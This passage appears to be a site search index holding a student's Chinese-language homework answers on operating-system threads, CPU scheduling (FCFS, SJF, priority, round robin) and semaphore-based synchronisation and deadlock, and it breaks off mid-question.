</ul>","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2019/09/23/2019-09-23-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5-chapter4-%E4%BD%9C%E4%B8%9A/","title":"\u64cd\u4f5c\u7cfb\u7edf\u7b2c\u4e09\u7ae0 \u4f5c\u4e1a","text":"","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2019/09/23/2019-09-23-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5-chapter4-%E4%BD%9C%E4%B8%9A/#41","title":"4.1","text":"<p>Provide two programming examples in which multithreading does not provide better performance than a single-threaded solution.</p> <p>1) \u4efb\u4f55\u201c\u7ebf\u6027\u201d\u6267\u884c\u7684\u7a0b\u5e8f\uff08\u540e\u9762\u7684\u7a0b\u5e8f\u4e25\u91cd\u4f9d\u8d56\u524d\u9762\u6267\u884c\u7684\u7ed3\u679c\uff09\uff0c\u8fd9\u7c7b\u7a0b\u5e8f\u5373\u4f7f\u4f7f\u7528\u591a\u7ebf\u7a0b\uff0c\u6bcf\u4e2a\u7ebf\u7a0b\u90fd\u4f1a\u963b\u585e\u5176\u5b83\u7ebf\u7a0b\u7684\u6267\u884c\uff0c\u56e0\u6b64\u5e76\u4e0d\u4f1a\u6709\u66f4\u597d\u7684\u6027\u80fd\u3002</p> <p>2) \u53ea\u6267\u884c\u5355\u4e00\u4efb\u52a1\u7684\u7a0b\u5e8f\u3002\u591a\u7ebf\u7a0b\u5bf9\u4e8e\u6d4f\u89c8\u5668\uff0c\u5b57\u5904\u7406\u8f6f\u4ef6\u7b49\u591a\u4efb\u52a1\u8f6f\u4ef6\u662f\u6709\u7528\u7684\u3002\u5982\u6d4f\u89c8\u5668\u53ef\u4ee5\u5728\u63a5\u6536\u7f51\u7edc\u6570\u636e\u65f6\u540c\u65f6\u5237\u65b0\u9875\u9762\u3002\u4f46\u5bf9\u4e8e\u53ea\u6267\u884c\u5355\u4e2a\u4efb\u52a1\u7684\u7a0b\u5e8f\uff0c\u4fbf\u6ca1\u6709\u5fc5\u8981\u3002</p>","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2019/09/23/2019-09-23-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5-chapter4-%E4%BD%9C%E4%B8%9A/#42","title":"4.2","text":"<p>Describe the actions taken by a thread library to context switch between user-level threads.</p> <p>\u7528\u6237\u7ea7\u7ebf\u7a0b\u5e93\u7684\u4ee3\u7801\u90fd\u5b58\u5728\u4e8e\u7528\u6237\u7a7a\u95f4\uff0c\u56e0\u6b64\u8c03\u7528\u5e93\u4e2d\u7684\u51fd\u6570\u4f1a\u5bfc\u81f4\u4e00\u4e2a\u672c\u5730\u8c03\u7528\u800c\u4e0d\u662f\u7cfb\u7edf\u8c03\u7528\u3002\u56e0\u4e3a\u7ebf\u7a0b\u4e3b\u8981\u5305\u62ec\u5bc4\u5b58\u5668\u7684\u503c\u548c\u6808\uff0c\u56e0\u6b64\u4e0a\u4e0b\u6587\u5207\u6362\u4f1a\u6d89\u5230\u5bc4\u5b58\u5668\u548c\u6808\u72b6\u6001\u7684\u4fdd\u5b58\u548c\u6062\u590d\u3002</p>","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2019/09/23/2019-09-23-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5-chapter4-%E4%BD%9C%E4%B8%9A/#43","title":"4.3","text":"<p>Under what circumstances does a multithreaded solution using multiple kernel threads provide better performance than a single-threaded solution on a single-processor system?</p> <p>1\uff09\u4e00\u4e2a\u5e94\u7528\u7a0b\u5e8f\u5206\u4e3a\u8bb8\u591a\u4e0d\u540c\u7684\u90e8\u5206\u3002\u5982\u7f51\u9875\u6d4f\u89c8\u5668\u6709\u4e00\u4e2a\u7ebf\u7a0b\u7528\u4e8e\u663e\u793a\u56fe\u50cf\u548c\u6587\u672c\uff0c\u53e6\u4e00\u4e2a\u7528\u4e8e\u4ece\u7f51\u7edc\u63a5\u6536\u6570\u636e\u3002 2\uff09\u4e00\u4e2a\u5e94\u7528\u7a0b\u5e8f\u9700\u8981\u6267\u884c\u591a\u4e2a\u76f8\u4f3c\u7684\u4efb\u52a1\u3002\u5982\u7f51\u9875\u670d\u52a1\u5668\u53ef\u80fd\u8981\u5904\u7406\u4e0a\u5343\u4e2a\u5ba2\u6237\u5e76\u53d1\u8bf7\u6c42\u7f51\u9875\u3002</p>","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2019/09/23/2019-09-23-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5-chapter4-%E4%BD%9C%E4%B8%9A/#44","title":"4.4","text":"<p>Which of the following components of program state are shared across threads in a multithreaded process?</p> <ul> <li>a. Register values</li> <li>b. Heap memory</li> <li>c. Global variables</li> <li>d. Stack memory</li> </ul> <p>\u7b54\uff1ab,c</p>","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2019/09/23/2019-09-23-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5-chapter4-%E4%BD%9C%E4%B8%9A/#48","title":"4.8","text":"<p>Consider a multiprocessor system and a multithreaded program written using the many-to-many threading model. Let the number of user-level threads in the program be more than the number of processors in the system. Discuss the performance implications of the following scenarios.</p> <p>a. The number of kernel threads allocated to the program is less than the number of processors.</p> <p>b. The number of kernel threads allocated to the program is equal to the number of processors.</p> <p>c. The number of kernel threads allocated to the program is greater than the number of processors but less than the number of user-level threads.</p> <p>\u7b54\uff1a\u5f53\u5185\u6838\u7ebf\u7a0b\u5c0f\u4e8e\u5904\u7406\u5668\u6570\u76ee\u65f6\uff0c\u56e0\u4e3a\u7528\u6237\u7ebf\u7a0b\u53ea\u80fd\u901a\u8fc7\u5185\u6838\u7ebf\u7a0b\u8bbf\u95ee\u5904\u7406\u5668\uff0c\u56e0\u6b64\u4f1a\u6709\u4e00\u4e9b\u5904\u7406\u5668\u5904\u4e8e\u201c\u56f4\u89c2\u201d\u72b6\u6001\u3002\u5f53\u5185\u6838\u7ebf\u7a0b\u521a\u597d\u7b49\u4e8e\u5904\u7406\u5668\u65f6\uff0c\u5904\u7406\u5668\u7684\u6548\u7387\u76f8\u5bf9\u4e8e a \u4f1a\u63d0\u9ad8\uff0c\u7136\u800c\u5f53\u4e00\u4e2a\u7ebf\u7a0b\u6267\u884c\u4e86\u963b\u585e\u7cfb\u7edf\u8c03\u7528\u65f6\uff0c\u5176\u5b83\u7528\u6237\u7ebf\u7a0b\u5c31\u65e0\u6cd5\u4f7f\u7528\u8be5\u5185\u6838\u8fdb\u7a0b\uff0cc \u7684\u60c5\u51b5\u5219\u5f25\u8865\u4e86\u8fd9\u4e00\u70b9\uff0c\u5f53\u4e00\u4e2a\u7528\u6237\u7ebf\u7a0b\u963b\u585e\u65f6\u53ef\u4ee5\u88ab\u5176\u5b83\u7528\u6237\u7ebf\u7a0b\u66ff\u6362\uff0c\u56e0\u6b64\u5904\u7406\u5668\u6548\u7387\u6700\u9ad8\u3002</p>","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2019/10/08/2019-10-08-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E7%AC%AC%E4%BA%94%E7%AB%A0%E4%BD%9C%E4%B8%9A-CPU%E8%B0%83%E5%BA%A6/","title":"\u64cd\u4f5c\u7cfb\u7edf\u7b2c\u4e94\u7ae0\u4f5c\u4e1a CPU \u8c03\u5ea6","text":"","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2019/10/08/2019-10-08-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E7%AC%AC%E4%BA%94%E7%AB%A0%E4%BD%9C%E4%B8%9A-CPU%E8%B0%83%E5%BA%A6/#51-why-is-it-important-for-the-scheduler-to-distinguish-io-bound-programs-from-cpu-bound-programs","title":"5.1. Why is it important for the scheduler to distinguish I/O-bound programs from CPU-bound programs?","text":"<p>\u5bf9\u4e8e\u957f\u671f\u8c03\u5ea6\u7a0b\u5e8f\uff0c\u77e5\u9053\u8fdb\u7a0b\u662f IO \u7ea6\u675f\u7684\u8fd8\u662f CPU \u7ea6\u675f\u7684\u4e4b\u540e\uff0c\u4fbf\u53ef\u4ee5\u6309\u7167\u4e00\u5b9a\u6bd4\u4f8b\u7ec4\u5408\u88ab\u8c03\u5ea6\u7684\u8fdb\u7a0b\uff0c\u4f7f\u5f97 CPU \u548c IO \u8bbe\u5907\u90fd\u4f1a\u4e00\u76f4\u5904\u4e8e\u8d1f\u8f7d\u72b6\u6001\uff0c\u4ece\u800c\u63d0\u9ad8\u8d44\u6e90\u7684\u4f7f\u7528\u7387\u3002 \u5bf9\u4e8e\u77ed\u671f\u8c03\u5ea6\uff08CPU \u8c03\u5ea6\uff09\uff0cIO \u7ea6\u675f\u7684\u8fdb\u7a0b CPU \u533a\u95f4\u90fd\u6bd4\u8f83\u77ed\uff0c\u800c CPU \u8d8a\u82cf\u8fdb\u7a0b\u5219\u6bd4\u8f83\u957f\uff0c\u56e0\u800c\u6839\u636e\u6700\u77ed\u4f5c\u4e1a\u4f18\u5148\u51c6\u5219\uff0c\u53ef\u4ee5\u4f18\u5148\u8c03\u5ea6 IO \u7ea6\u675f\u8fdb\u7a0b\u3002</p>","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2019/10/08/2019-10-08-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E7%AC%AC%E4%BA%94%E7%AB%A0%E4%BD%9C%E4%B8%9A-CPU%E8%B0%83%E5%BA%A6/#52-discuss-how-the-following-pairs-of-scheduling-criteria-conflict-in-certain-settings","title":"5.2. Discuss how the following pairs of scheduling criteria conflict in certain settings","text":"<ul> <li>a. CPU utilization and response time CPU \u5229\u7528\u7387\u4e0e\u4e0a\u4e0b\u6587\u4ea4\u6362\u9891\u7387\u6210\u8d1f\u76f8\u5173\uff0c\u800c\u54cd\u5e94\u65f6\u95f4\u4e0e\u4e4b\u6210\u6b63\u76f8\u5173\uff0c\u6545\u51b2\u7a81\u3002</li> </ul> <ul> <li>b. Average turnaround time and maximum waiting time \u4e3a\u4e86\u51cf\u5c0f\u5e73\u5747\u5468\u8f6c\u65f6\u95f4\uff0c\u901a\u5e38\u4f1a\u91c7\u7528\u77ed\u4f5c\u4e1a\u4f18\u5148\u7b97\u6cd5\uff0c\u800c\u8fd9\u4f1a\u4ee4\u957f\u4f5c\u4e1a\u7684\u7b49\u5f85\u65f6\u95f4\u589e\u5927\u3002</li> </ul> <ul> <li>c. I/O device utilization and CPU utilization \u4e3a\u4e86\u63d0\u9ad8 I/O \u8bbe\u5907\u7684\u5229\u7528\u7387\uff0c\u9700\u8981\u4f18\u5148\u6267\u884c IO bound \u8fdb\u7a0b\uff0c\u56e0\u4e3a IO \u7ea6\u675f\u7684\u8fdb\u7a0b CPU \u533a\u95f4\u77ed\uff0c\u56e0\u800c\u5bfc\u81f4\u9891\u7e41\u7684\u4e0a\u4e0b\u6587\u4ea4\u6362\uff0c\u56e0\u800c\u964d\u4f4e CPU \u6548\u7387\u3002</li> </ul>","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2019/10/08/2019-10-08-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E7%AC%AC%E4%BA%94%E7%AB%A0%E4%BD%9C%E4%B8%9A-CPU%E8%B0%83%E5%BA%A6/#54-consider-the-following-set-of-processes-with-the-length-of-the-cpu-burst-time-given-in-milliseconds","title":"5.4 Consider the following set of processes, with the length of the CPU-burst time given in milliseconds","text":"Process Burst Time Priority $ P_1 $ 10 3 $ P_2 $ 1 1 $ P_3 $ 2 3 $ P_4 $ 1 4 $ P_5 $ 5 2 <p>The processes are assumed to have arrived in the order $ P_1,P_2,P_3,P_4,P_5 $, all at time 0.</p> <ul> <li>a. Draw four Gantt charts illustrating the execution of these processes using FCFS , SJF , a nonpreemptive priority (a smaller priority number implies a higher priority), and RR (quantum = 1) scheduling.     1. FCFS         $ P_1 $ (10) \u2003\u2003\u2003\u2003\u2003 | $ P_2 $(1) \u2002 | $ P_3 $(2) \u2003 | $ P_4 \\((1) \u2002 |\\) P_5 $  (5) \u2003\u2003\u2002         --- | --- | --- | --- | ---     2. SJF         $ P_2 $(1) \u2002  | $ P_4 $(1) \u2002 | $ P_3 $(2) \u2003 | $ P_5 $  (5) \u2003\u2003\u2002 | $ P_1 $ (10) \u2003\u2003\u2003\u2003\u2003         --- | --- | --- | --- | ---     3. nopreemptive priority         $ P_2 $(1) \u2002  | $ P_5 $  (5) \u2003\u2003\u2002 | $ P_1 $ (10) \u2003\u2003\u2003\u2003\u2003 | $ P_3 $(2) \u2003 | $ P_4 $(1) \u2002         --- | --- | --- | --- | ---     4. Round Robin         $ P_1 $| $ P_2 $ | $ P_3 $ | $ P_4 $ |$ P_5 $ | $ P_1 $| $ P_3 $ | $ P_5 $ | $ P_1 $ |$ P_5 $ | $ P_1 $ | $ P_5 $ | $ P_1 $ | $ P_5 $ | $ P_1 $ | $ P_1 $ | $ P_1 $ | $ P_1 $ | $ P_1 $ |         --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |</li> <li>b. What is the turnaround time of each process for each of the scheduling algorithms in part a? FCFS SJF nopreemptive priority RR $ P_1 $ 10 19 16 19 $ P_2 $ 11 1 1 2 $ P_3 $ 13 4 18 7 $ P_4 $ 14 2 19 4 $ P_5 $ 19 9 6 14 </li> </ul> <ul> <li>c. What is the waiting time of each process for each of the scheduling algorithms in part a? FCFS SJF nopreemptive priority RR $ P_1 $ 0 9 6 9 $ P_2 $ 10 0 0 1 $ P_3 $ 11 2 16 5 $ P_4 $ 13 1 18 3 $ P_5 $ 14 4 1 9 sum 48 16 41 27 - d. Which of the schedules in part a results in the minimal average waiting time (over all processes)? <p>\u7b54\uff1aSJF with 3.2 ms</p> </li> </ul>","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2019/10/08/2019-10-08-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E7%AC%AC%E4%BA%94%E7%AB%A0%E4%BD%9C%E4%B8%9A-CPU%E8%B0%83%E5%BA%A6/#510-explain-the-differences-in-the-degree-to-which-the-following-scheduling-algorithms-discriminate-in-favor-of-short-processes","title":"5.10 Explain the differences in the degree to which the following scheduling algorithms discriminate in favor of short processes","text":"<ul> <li>a. FCFS</li> <li>b. RR</li> <li>c. Multilevel feedback queues</li> </ul> <p>\u7b54\uff1a</p> <ul> <li>FCFS \u54ea\u4e2a\u5148\u5230\u54ea\u4e2a\u4f18\u5148\uff0c\u56e0\u6b64\u5bf9\u5f85\u77ed\u8fdb\u7a0b\u548c\u957f\u8fdb\u7a0b\u662f\u5e73\u7b49\u7684\u3002</li> <li>RR \u7ed9\u6bcf\u4e2a\u8fdb\u7a0b\u5206\u914d\u76f8\u540c\u7684\u65f6\u95f4\u7247\uff0c\u56e0\u6b64\u4e5f\u662f\u5e73\u7b49\u7684\u3002</li> <li>\u5bf9\u4e8e\u4e00\u79cd\u5178\u578b\u7684\u591a\u7ea7\u53cd\u9988\u961f\u5217\u7b97\u6cd5\uff08\u6709\u4e09\u4e2a\u961f\u5217\uff0c\u524d\u4e24\u4e2a\u4f7f\u7528 RR \u7b97\u6cd5\uff0c\u65f6\u95f4\u7247\u5206\u522b\u4e3a 8ms\uff0c16ms\uff0c\u7b2c\u4e09\u4e2a\u4f7f\u7528 FCFS \u7b97\u6cd5\uff0c\u961f\u5217\u95f4\u4f7f\u7528\u62a2\u5360\u5f0f\u4f18\u5148\u7ea7\u7b97\u6cd5\uff09\uff0c\u77ed\u4f5c\u4e1a\u90fd\u4f1a\u5904\u4e8e\u524d\u9762\u7684\u961f\u5217\uff0c\u4ee5\u6b64\u77ed\u4f5c\u4e1a\u7684\u4f18\u5148\u7ea7\u66f4\u9ad8\u3002</li> </ul>","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2019/10/08/2019-10-08-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E7%AC%AC%E4%BA%94%E7%AB%A0%E4%BD%9C%E4%B8%9A-CPU%E8%B0%83%E5%BA%A6/#5-please-prove-sjf-gives-the-minimum-average-waiting-time-for-a-given-set-of-processes-to-arrive-at-the-same-time","title":"5. Please prove: SJF gives the minimum average waiting time for a given set of processes to arrive at the same time","text":"<p>\u5047\u8bbe CPU \u6309\u7167\u4e00\u5b9a\u987a\u5e8f\u6267\u884c\u8fd9\u4e9b\u8fdb\u7a0b\uff0c\u6bcf\u4e2a\u8fdb\u7a0b CPU \u533a\u95f4\u5206\u522b\u4e3a$ t_1,t_2,\\dots,t_n $\u3002\uff08\u975e\u62a2\u5360\uff09 \u5219\u5e73\u5747\u7b49\u5f85\u65f6\u95f4\u4e3a\uff1a $$     \\overline t = \\frac{1}{n}\\sum_{i=1}^n{(i-1)t_i} $$ \u7531\u6392\u5e8f\u4e0d\u7b49\u5f0f\u77e5$ t_1,t_2,\\dots,t_n $\u964d\u5e8f\u65f6\u6700\u77ed\uff0c\u5373 SJF \u7b97\u6cd5\u3002</p>","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2019/10/08/2019-10-08-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E7%AC%AC%E4%BA%94%E7%AB%A0%E4%BD%9C%E4%B8%9A-CPU%E8%B0%83%E5%BA%A6/#6-what-is-processor-affinity-what-is-load-balancing-what-is-the-relationship-between-the-two","title":"6. What is Processor Affinity? What is load balancing? What is the relationship between the two?","text":"<p>\u5904\u7406\u5668\u4eb2\u548c\u6027\u6307\u5728\u591a\u5904\u7406\u5668\u8c03\u5ea6\u7b97\u6cd5\u4e2d\uff0c\u7531\u4e8e cache miss \u7684\u4ee3\u4ef7\u6bd4\u8f83\u9ad8\uff0c\u5e94\u8be5\u52aa\u529b\u8ba9\u4e00\u4e2a\u8fdb\u7a0b\u5728\u4e00\u4e2a\u5904\u7406\u5668\u4e0a\u8fd0\u884c\u3002 \u800c\u8d1f\u8f7d\u5e73\u8861\u6307\u5c06\u5de5\u4f5c\u8d1f\u8f7d\u5e73\u5747\u5206\u914d\u5230\u6bcf\u4e2a\u5904\u7406\u5668\u4e0a\uff0c\u4ece\u800c\u4fdd\u6301\u6bcf\u4e2a\u5904\u7406\u5668\u4f7f\u7528\u7387\u90fd\u6bd4\u8f83\u9ad8\u3002 \u56e0\u6b64\u5f53\u4e00\u4e2a\u5904\u7406\u5668\u8d1f\u8f7d\u8f83\u9ad8\u65f6\uff0c\u8d1f\u8f7d\u5e73\u5e73\u8861\u7b56\u7565\u4f1a\u503e\u5411\u8ba9\u8d1f\u8f7d\u5206\u914d\u5230\u591a\u4e2a\u5904\u7406\u5668\u4e0a\uff0c\u800c\u5904\u7406\u5668\u4eb2\u548c\u5219\u503e\u5411\u4fdd\u6301\u8be5\u72b6\u6001\u3002 \u56e0\u6b64\u8fd9\u4e24\u79cd\u7b56\u7565\u6709\u77db\u76fe\u7684\u5173\u7cfb\u3002</p>","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2019/10/16/2019-10-16-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E5%85%AD%E7%AB%A0%E4%BD%9C%E4%B8%9A-%E8%BF%9B%E7%A8%8B%E5%90%8C%E6%AD%A5/","title":"\u64cd\u4f5c\u7cfb\u7edf\u7b2c\u516d\u7ae0\u4f5c\u4e1a \u8fdb\u7a0b\u540c\u6b65","text":"","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2019/10/16/2019-10-16-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E5%85%AD%E7%AB%A0%E4%BD%9C%E4%B8%9A-%E8%BF%9B%E7%A8%8B%E5%90%8C%E6%AD%A5/#1-what-is-the-meaning-of-the-term-busy-waiting","title":"1. What is the meaning of the term busy waiting?","text":"<p>\u5f53\u4e00\u4e2a\u8fdb\u7a0b\u4f4d\u4e8e\u4e34\u754c\u533a\u65f6\uff0c\u4efb\u4f55\u5176\u5b83\u8bd5\u56fe\u8fdb\u5165\u4e34\u754c\u533a\u7684\u8fdb\u7a0b\u90fd\u5fc5\u987b\u5728\u4ee3\u7801\u4e2d\u4e0d\u65ad\u5730\u5faa\u73af\u3002</p>","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2019/10/16/2019-10-16-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E5%85%AD%E7%AB%A0%E4%BD%9C%E4%B8%9A-%E8%BF%9B%E7%A8%8B%E5%90%8C%E6%AD%A5/#2-what-is-the-meaning-of-the-term-spinlocks","title":"2. What is the meaning of the term spinlocks?","text":"<p>\u81ea\u65cb\u9501\u662f\u4e00\u79cd\u4f1a\u9020\u6210\u5fd9\u7b49\u7684\u4fe1\u53f7\u91cf\uff0c\u5728\u8fdb\u7a0b\u7b49\u5f85\u9501\u65f6\u8fd8\u9700\u4e0d\u65ad\u8fd0\u884c\uff0c\u5360\u7528 cpu \u8d44\u6e90\u3002</p>","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2019/10/16/2019-10-16-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E5%85%AD%E7%AB%A0%E4%BD%9C%E4%B8%9A-%E8%BF%9B%E7%A8%8B%E5%90%8C%E6%AD%A5/#3-explain-the-deadlock-and-give-an-example","title":"3. Explain the deadlock and give an example","text":"<p>\u82e5\u5e72\u4e2a\u8fdb\u7a0b\u7ade\u4e89\u7cfb\u7edf\u8d44\u6e90\uff0c\u6700\u540e\u6bcf\u4e2a\u8fdb\u7a0b\u90fd\u5fc5\u987b\u5f97\u5728\u5176\u5b83\u8fdb\u7a0b\u91ca\u653e\u8d44\u6e90\u65f6\u624d\u80fd\u6539\u53d8\u72b6\u6001\uff0c\u56e0\u800c\u65e0\u6cd5\u6539\u53d8\u72b6\u6001\uff0c\u9020\u6210\u6b7b\u9501\u3002 \u5982\u4ee5\u4e0b\u7a0b\u5e8f\u5728 A\uff0cB \u540c\u65f6\u8fd0\u884c\u65f6\u9020\u6210\u6b7b\u9501\u3002 A:</p> <pre><code>wait(S)\nwait(Q)\n...\nsignal(S)\nsignal(Q)\n</code></pre> <p>B:</p> <pre><code>wait(Q)\nwait(S)\n...\nsignal(S)\nsignal(Q)\n</code></pre>","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2019/10/16/2019-10-16-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E5%85%AD%E7%AB%A0%E4%BD%9C%E4%B8%9A-%E8%BF%9B%E7%A8%8B%E5%90%8C%E6%AD%A5/#4","title":"4","text":"<p>Servers can be designed to limit the number of open connections. For example, a server may wish to have only N socket connections at any point in time. As soon as N connections are made, the server will not accept another incoming connection until an existing connection is released. Explain how semaphores can be used by a server to limit the number of concurrent connections. (6.8)</p> <p>\u521d\u59cb\u5316\u8ba1\u6570\u578b\u4fe1\u53f7\u91cf connection=N</p> <pre><code>wait(connection)\n//do something\nsignal(connection)\n</code></pre>","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2019/10/16/2019-10-16-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E5%85%AD%E7%AB%A0%E4%BD%9C%E4%B8%9A-%E8%BF%9B%E7%A8%8B%E5%90%8C%E6%AD%A5/#5-what-operations-can-be-performed-on-a-semaphore-list-them-and-explain-the-means-of-semaphore-values","title":"5. What operations can be performed on a semaphore? List them and explain the means of semaphore values","text":"<p>wait() \u548c signal() \u64cd\u4f5c\u3002 \u4fe1\u53f7\u91cf\u53ef\u5206\u4e3a\u8ba1\u6570\u4fe1\u53f7\u91cf\u4e0e\u4e8c\u8fdb\u5236\u4fe1\u53f7\u91cf\u3002\u8ba1\u6570\u4fe1\u53f7\u91cf\u503c\u57df\u4e0d\u53d7\u9650\u5236\uff0c\u4ee3\u8868\u7cfb\u7edf\u53d7\u9650\u8d44\u6e90\u7684\u6570\u91cf\u3002 \u4e8c\u8fdb\u5236\u4fe1\u53f7\u91cf\u7684\u503c\u53ea\u80fd\u4e3a 0 \u6216 1\uff0c\u53ef\u8868\u793a\u5bf9\u4e34\u754c\u533a\u7684\u8bbf\u95ee\u6743\uff08\u53ea\u80fd\u6709\u4e00\u4e2a\u8fdb\u7a0b\u4f4d\u4e8e\u4e34\u754c\u533a\uff09\u3002</p>","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2019/10/16/2019-10-16-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E5%85%AD%E7%AB%A0%E4%BD%9C%E4%B8%9A-%E8%BF%9B%E7%A8%8B%E5%90%8C%E6%AD%A5/#6-how-does-the-signal-operation-associated-with-monitors-differ-from-the-corresponding-operation-defined-for-semaphores-616","title":"6. How does the signal() operation associated with monitors differ from the corresponding operation defined for semaphores? (6.16)","text":"<p>\u5f53\u6ca1\u6709\u8fdb\u7a0b\u7b49\u5f85\u65f6\uff0c\u4fe1\u53f7\u91cf\u7684 signal() \u4f1a\u5bf9\u4fe1\u53f7\u91cf\u7684\u503c\u52a0\u4e00\uff0c\u800c\u7ba1\u7a0b\u91cc\u7684 signal() \u5219\u4e0d\u4f1a\u8fdb\u884c\u4efb\u4f55\u64cd\u4f5c\u3002</p>","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2019/10/16/2019-10-16-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E5%85%AD%E7%AB%A0%E4%BD%9C%E4%B8%9A-%E8%BF%9B%E7%A8%8B%E5%90%8C%E6%AD%A5/#7","title":"7","text":"<p>A uniprocessor system concurrently executes 2 processes ($ P_A, P_B $). Two Semaphores $ Mutex_R_a $ and $ Mutex_R_b $ are added in mutual accessing the critical section and synchronizing between $ P_A $ and $ P_B $ . Please read following program segment carefully and answer the questions:</p> <p>(1) What are initial values for $ Mutex_R_a $ and $ Mutex_R_b $ . (2) Is it possible to cause deadlock? Please state your reason. Semaphore $ Mutex_R_a $, $ Mutex_R_b $ ;</p> <pre><code>Void P_A ( ){\n    while(true){\n        Wait(Mutex_Ra );\n        ......\n        Wait(Mutex_Rb );\n        ......\n        Signal(Mutex_Ra );\n        ......\n        Signal(Mutex_Rb );\n    }\n}\n</code></pre> <pre><code>Void P_B ( ){\n    while(true){\n        Wait(Mutex_Rb );\n        ......\n        Wait(Mutex_Ra );\n        ......\n        Signal(Mutex_Rb );\n        ......\n        Signal(Mutex_Ra );\n    }\n}\n</code></pre> <p>\u7b54\uff1a (1) $ Mutex_R_a = Mutex_R_b = 1$ (2) \u5f53 P_A \u548c P_B \u540c\u65f6\u5230\u8fbe\u65f6\uff0c\u4e24\u4e2a\u8fdb\u7a0b\u90fd\u4f1a\u6267\u884c\u7b2c\u4e00\u53e5\uff0c\u63a5\u7740\u4fbf\u4f1a\u7531\u4e8e$ Mutex_R_a = Mutex_R_b = 0$\u800c\u9677\u5165\u6b7b\u9501\u3002</p>","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2019/10/16/2019-10-16-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E5%85%AD%E7%AB%A0%E4%BD%9C%E4%B8%9A-%E8%BF%9B%E7%A8%8B%E5%90%8C%E6%AD%A5/#8","title":"8","text":"<p>\u8bbe\u6709\u4e00\u4e2a\u53ef\u4ee5\u88c5 A\u3001B \u4e24\u79cd\u7269\u54c1\u7684\u4ed3\u5e93\uff0c\u5176\u5bb9\u91cf\u6709\u9650 (\u4e3a 